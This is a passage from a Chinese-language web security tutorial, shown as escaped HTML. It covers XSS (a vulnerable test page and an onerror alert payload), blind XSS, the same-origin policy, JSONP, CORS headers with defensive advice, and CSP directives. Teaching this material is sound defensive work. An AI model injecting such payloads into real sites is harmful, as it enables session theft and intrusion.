punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;output&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;input&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;50&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;button&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token special-attr&#34;&gt;&lt;span class=&#34;token attr-name&#34;&gt;onclick&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token value javascript language-javascript&#34;&gt;&lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入  &lt;code&gt;x&#39; onerror=&#39;javascript:alert(/xss/)&lt;/code&gt;  即可触发。&lt;/p&gt;
&lt;h2 id=&#34;blind-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blind-xss&#34;&gt;#&lt;/a&gt; Blind XSS&lt;/h2&gt;
&lt;p&gt;Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个 “受害者” 访问这个页面时执行，并且在文档对象模型 (DOM) 中呈现 payload。 它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。&lt;/p&gt;
&lt;h1 id=&#34;危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#危害&#34;&gt;#&lt;/a&gt; 危害&lt;/h1&gt;
&lt;p&gt;存在 XSS 漏洞时，可能会导致以下几种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。&lt;/li&gt;
&lt;li&gt;攻击者能够在一定限度内记录用户的键盘输入。&lt;/li&gt;
&lt;li&gt;攻击者通过 CSRF 等方式以用户身份执行危险操作。&lt;/li&gt;
&lt;li&gt;XSS 蠕虫。&lt;/li&gt;
&lt;li&gt;获取用户浏览器信息。&lt;/li&gt;
&lt;li&gt;利用 XSS 漏洞扫描用户内网。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由 URL 决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。&lt;/p&gt;
&lt;h3 id=&#34;file域的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#file域的同源策略&#34;&gt;#&lt;/a&gt; file 域的同源策略&lt;/h3&gt;
&lt;p&gt;在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。&lt;/p&gt;
&lt;p&gt;从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。&lt;/p&gt;
&lt;h3 id=&#34;cookie的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie的同源策略&#34;&gt;#&lt;/a&gt; cookie 的同源策略&lt;/h3&gt;
&lt;p&gt;cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。&lt;/p&gt;
&lt;p&gt;不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用  &lt;code&gt;domain&lt;/code&gt;  /  &lt;code&gt;path&lt;/code&gt;  /  &lt;code&gt;secure&lt;/code&gt;  和  &lt;code&gt;http-only&lt;/code&gt;  标记来限定其访问性。&lt;/p&gt;
&lt;p&gt;所以  &lt;code&gt;https://localhost:8080/&lt;/code&gt;  和  &lt;code&gt;http://localhost:8081/&lt;/code&gt;  的 Cookie 是共享的。&lt;/p&gt;
&lt;h3 id=&#34;flashsilverlight跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flashsilverlight跨域&#34;&gt;#&lt;/a&gt; Flash/SilverLight 跨域&lt;/h3&gt;
&lt;p&gt;浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。&lt;/p&gt;
&lt;p&gt;客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。&lt;/p&gt;
&lt;h2 id=&#34;源的更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源的更改&#34;&gt;#&lt;/a&gt; 源的更改&lt;/h2&gt;
&lt;p&gt;同源策略认为域和子域属于不同的域，例如  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;a.com&lt;/code&gt;  /  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;child2.a.com&lt;/code&gt;  /  &lt;code&gt;xxx.child1.a.com&lt;/code&gt;  与  &lt;code&gt;child1.a.com&lt;/code&gt;  两两不同源。&lt;/p&gt;
&lt;p&gt;对于这种情况，可以在两个方面各自设置  &lt;code&gt;document.domain=&#39;a.com&#39;&lt;/code&gt;  来改变其源来实现以上任意两个页面之间的通信。&lt;/p&gt;
&lt;p&gt;另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为  &lt;code&gt;null&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源访问&#34;&gt;#&lt;/a&gt; 跨源访问&lt;/h2&gt;
&lt;p&gt;同源策略控制了不同源之间的交互，这些交互通常分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常允许跨域写操作 (Cross-origin writes)
&lt;ul&gt;
&lt;li&gt;链接 (links)&lt;/li&gt;
&lt;li&gt;重定向&lt;/li&gt;
&lt;li&gt;表单提交&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通常允许跨域资源嵌入 (Cross-origin embedding)&lt;/li&gt;
&lt;li&gt;通常不允许跨域读操作 (Cross-origin reads)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可能嵌入跨源的资源的一些示例有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;  标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;  标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;video&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;audio&amp;gt;&lt;/code&gt;  嵌入多媒体资源。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;   &lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;applet&amp;gt;&lt;/code&gt;  的插件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@font-face&lt;/code&gt;  引入的字体。一些浏览器允许跨域字体 (cross-origin fonts)，一些需要同源字体 (same-origin fonts)。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;frame&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;jsonp跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsonp跨域&#34;&gt;#&lt;/a&gt; JSONP 跨域&lt;/h3&gt;
&lt;p&gt;JSONP 就是利用  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。&lt;/p&gt;
&lt;p&gt;服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。&lt;/p&gt;
&lt;p&gt;JSONP 也存在一些安全问题，例如当对传入 / 传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。&lt;/p&gt;
&lt;p&gt;另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。&lt;/p&gt;
&lt;h3 id=&#34;跨源脚本api访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源脚本api访问&#34;&gt;#&lt;/a&gt; 跨源脚本 API 访问&lt;/h3&gt;
&lt;p&gt;Javascript 的 APIs 中，如  &lt;code&gt;iframe.contentWindow&lt;/code&gt;  ,  &lt;code&gt;window.parent&lt;/code&gt; ,  &lt;code&gt;window.open&lt;/code&gt;  和  &lt;code&gt;window.opener&lt;/code&gt;  允许文档间相互引用。当两个文档的源不同时，这些引用方式将对  &lt;code&gt;window&lt;/code&gt;  和  &lt;code&gt;location&lt;/code&gt;  对象的访问添加限制。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的方法有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.blur&lt;/li&gt;
&lt;li&gt;window.close&lt;/li&gt;
&lt;li&gt;window.focus&lt;/li&gt;
&lt;li&gt;window.postMessage&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的属性有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.closed&lt;/li&gt;
&lt;li&gt;window.frames&lt;/li&gt;
&lt;li&gt;window.length&lt;/li&gt;
&lt;li&gt;window.location&lt;/li&gt;
&lt;li&gt;window.opener&lt;/li&gt;
&lt;li&gt;window.parent&lt;/li&gt;
&lt;li&gt;window.self&lt;/li&gt;
&lt;li&gt;window.top&lt;/li&gt;
&lt;li&gt;window.window&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中  &lt;code&gt;window.location&lt;/code&gt;  允许读 / 写，其他的属性只允许读&lt;/p&gt;
&lt;h3 id=&#34;跨源数据存储访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源数据存储访问&#34;&gt;#&lt;/a&gt; 跨源数据存储访问&lt;/h3&gt;
&lt;p&gt;存储在浏览器中的数据，如  &lt;code&gt;localStorage&lt;/code&gt;  和  &lt;code&gt;IndexedDB&lt;/code&gt; ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。&lt;/p&gt;
&lt;h2 id=&#34;cors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cors&#34;&gt;#&lt;/a&gt; CORS&lt;/h2&gt;
&lt;p&gt;CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。&lt;/p&gt;
&lt;h3 id=&#34;常见请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见请求头&#34;&gt;#&lt;/a&gt; 常见请求头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Origin
&lt;ul&gt;
&lt;li&gt;预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Origin: &amp;lt;origin&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Method
&lt;ul&gt;
&lt;li&gt;声明请求使用的方法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Method: &amp;lt;method&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Headers
&lt;ul&gt;
&lt;li&gt;声明请求使用的 header 字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常见返回头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见返回头&#34;&gt;#&lt;/a&gt; 常见返回头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Access-Control-Allow-Origin
&lt;ul&gt;
&lt;li&gt;声明允许访问的源外域 URI&lt;/li&gt;
&lt;li&gt;对于携带身份凭证的请求不可使用通配符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*``Access-Control-Allow-Origin: &amp;lt;origin&amp;gt; | *&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Expose-Headers
&lt;ul&gt;
&lt;li&gt;声明允许暴露的头&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Max-Age
&lt;ul&gt;
&lt;li&gt;声明 Cache 时间&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Max-Age: &amp;lt;delta-seconds&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Credentials
&lt;ul&gt;
&lt;li&gt;声明是否允许在请求中带入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Credentials: true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Methods
&lt;ul&gt;
&lt;li&gt;声明允许的访问方式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Methods: &amp;lt;method&amp;gt;[, &amp;lt;method&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Headers
&lt;ul&gt;
&lt;li&gt;声明允许的头&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防御建议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御建议&#34;&gt;#&lt;/a&gt; 防御建议&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如非必要不开启 CORS&lt;/li&gt;
&lt;li&gt;定义详细的白名单，不使用通配符，仅配置所需要的头&lt;/li&gt;
&lt;li&gt;配置  &lt;code&gt;Vary: Origin&lt;/code&gt;  头部&lt;/li&gt;
&lt;li&gt;如非必要不使用  &lt;code&gt;Access-Control-Allow-Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;限制缓存的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;阻止跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阻止跨源访问&#34;&gt;#&lt;/a&gt; 阻止跨源访问&lt;/h2&gt;
&lt;p&gt;阻止跨域写操作，可以检测请求中的  &lt;code&gt;CSRF token&lt;/code&gt;  ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。&lt;/p&gt;
&lt;p&gt;阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守  &lt;code&gt;Content-Type&lt;/code&gt;  消息头。例如如果在 HTML 文档中指定  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标记，则浏览器会尝试将 HTML 解析为 JavaScript。&lt;/p&gt;
&lt;h1 id=&#34;csp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp&#34;&gt;#&lt;/a&gt; CSP&lt;/h1&gt;
&lt;h2 id=&#34;csp是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp是什么&#34;&gt;#&lt;/a&gt; CSP 是什么？&lt;/h2&gt;
&lt;p&gt;Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。&lt;/p&gt;
&lt;h2 id=&#34;配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置&#34;&gt;#&lt;/a&gt; 配置&lt;/h2&gt;
&lt;p&gt;CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。&lt;/p&gt;
&lt;p&gt;CSP 有三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Content-Security-Policy (Google Chrome)&lt;/li&gt;
&lt;li&gt;X-Content-Security-Policy (Firefox)&lt;/li&gt;
&lt;li&gt;X-WebKit-CSP (WebKit-based browsers, e.g. Safari)&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HTTP header :&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy-Report-Only:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report-Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。&lt;/p&gt;
&lt;p&gt;HTML Meta :&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy-report-only&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;指令说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#指令说明&#34;&gt;#&lt;/a&gt; 指令说明&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;default-src&lt;/td&gt;
&lt;td&gt;定义资源默认加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;connect-src&lt;/td&gt;
&lt;td&gt;定义 Ajax、WebSocket 等加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;font-src&lt;/td&gt;
&lt;td&gt;定义 Font 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;frame-src&lt;/td&gt;
&lt;td&gt;定义 Frame 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;img-src&lt;/td&gt;
&lt;td&gt;定义图片加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;media-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;audio&amp;gt;、&amp;lt;video&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;object-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;applet&amp;gt;、&amp;lt;embed&amp;gt;、&amp;lt;object&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;script-src&lt;/td&gt;
&lt;td&gt;定义 JS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;style-src&lt;/td&gt;
&lt;td&gt;定义 CSS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;base-uri&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;base&amp;gt; 根 URL 策略，不使用 default-src 作为默认值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
